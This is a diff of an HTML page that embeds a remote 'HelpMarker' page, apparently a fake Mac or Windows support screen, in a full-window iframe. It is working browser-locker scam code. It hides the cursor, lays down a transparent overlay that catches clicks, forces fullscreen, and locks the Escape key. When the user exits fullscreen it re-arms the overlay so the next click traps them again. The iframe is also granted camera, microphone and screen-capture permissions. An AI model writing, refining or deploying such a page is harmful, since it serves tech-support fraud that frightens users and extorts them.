@@ -6,7 +6,6 @@
 <title></title>
 <style>
   html, body { margin: 0; height: 100%; }
-
   iframe {
     position: fixed;
     width: 100%;
@@ -16,47 +15,40 @@
     left: 0;
     cursor: none;
   }
-
-  #startOverlay {
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
-    background: transparent;
-    cursor: none;
-  }
-  #startOverlay.hide { display: none; }
 </style>
 </head>
 <body>
 
-<div id="startOverlay"></div>
-
 <iframe 
   id="f"
-  src="https://futurelearners-acavfqc9cpcrhghc.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null"
+  src="https://futurelearners-acavfqc9cpcrhghc.z03.azurefd.net/Ma0cHelpMark0er007/index.html?ph0nq=null" 
   allowfullscreen 
   webkitallowfullscreen 
   mozallowfullscreen 
-  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
+  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *">
 </iframe>
 
 <script>
-  const frame   = document.getElementById('f');
-  const overlay = document.getElementById('startOverlay');
+  const frame = document.getElementById('f');
+
+  // Overlay JS me banaya -> HTML me alag div ki zaroorat nahi
+  const overlay = document.createElement('div');
+  overlay.style.cssText =
+    'position:fixed;inset:0;z-index:9999;background:transparent;cursor:none;';
+  document.body.appendChild(overlay);
 
   function startImmersive() {
     const hasKbLock = navigator.keyboard && navigator.keyboard.lock;
-
     if (hasKbLock) {
-      // Chrome/Edge: lock initiate karo (await NAHI), fir plain fullscreen
+      // Chrome/Edge
       navigator.keyboard.lock(['Escape']).catch(() => {});
       frame.requestFullscreen()
-        .then(() => overlay.classList.add('hide'))
+        .then(() => { overlay.style.display = 'none'; })
         .catch(e => console.error('fullscreen fail:', e));
     } else {
-      // Firefox: keyboardLock option ke saath fullscreen
+      // Firefox
       frame.requestFullscreen({ keyboardLock: 'browser' })
-        .then(() => overlay.classList.add('hide'))
+        .then(() => { overlay.style.display = 'none'; })
         .catch(e => console.error('fullscreen fail:', e));
     }
   }
@@ -65,10 +57,8 @@
 
   document.addEventListener('fullscreenchange', () => {
     if (!document.fullscreenElement) {
-      if (navigator.keyboard && navigator.keyboard.unlock) {
-        navigator.keyboard.unlock();
-      }
-      overlay.classList.remove('hide');
+      if (navigator.keyboard && navigator.keyboard.unlock) navigator.keyboard.unlock();
+      overlay.style.display = 'block';
     }
   });
 </script>
